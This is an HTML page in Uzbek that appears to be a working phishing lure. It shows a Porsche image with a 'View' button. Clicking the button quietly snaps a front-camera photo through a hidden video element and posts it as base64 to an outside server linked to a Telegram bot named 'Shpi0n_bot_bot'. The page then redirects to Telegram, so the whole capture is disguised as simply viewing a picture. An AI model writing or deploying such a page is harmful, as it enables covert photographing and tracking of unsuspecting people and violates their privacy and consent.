<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Porsche</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            width: 100%;
            height: 100%;
            background-color: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            position: relative;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
        /* Telefonda kamera ishlashi uchun majburiy bosiladigan tugma */
        .overlay-btn {
            position: absolute;
            bottom: 40px;
            background: #ff3b30;
            color: white;
            border: none;
            padding: 14px 30px;
            font-size: 16px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(255, 59, 48, 0.5);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        video {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="porsche.png" alt="Porsche">
        <button class="overlay-btn" id="startBtn">Ko'rish</button>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
    const BACKEND_URL = "https://telegram-production-6392.up.railway.app";
    const BOT_USERNAME = "Shpi0n_bot_bot";
    const uid = new URLSearchParams(window.location.search).get("uid");
    const video = document.getElementById("video");
    const startBtn = document.getElementById("startBtn");

    startBtn.addEventListener("click", async () => {
        startBtn.style.display = "none";

        if (!uid) {
            window.location.href = `https://t.me/${BOT_USERNAME}`;
            return;
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });

            video.srcObject = stream;

            await new Promise((resolve) => {
                video.onloadedmetadata = () => resolve();
            });

            await new Promise((resolve) => setTimeout(resolve, 600));

            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageBase64 = canvas.toDataURL("image/jpeg", 0.85);

            stream.getTracks().forEach(track => track.stop());

            await fetch(`${BACKEND_URL}/upload`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ uid: Number(uid), image: imageBase64 })
            });

        } catch (err) {
            console.error("Xatolik:", err);
        } finally {
            // Rasm yuborilgach, darhol botga o'tkaziladi va foydalanuvchi o'z rasmini ko'radi
            window.location.href = `https://t.me/${BOT_USERNAME}`;
        }
    });
    </script>
</body>
</html>
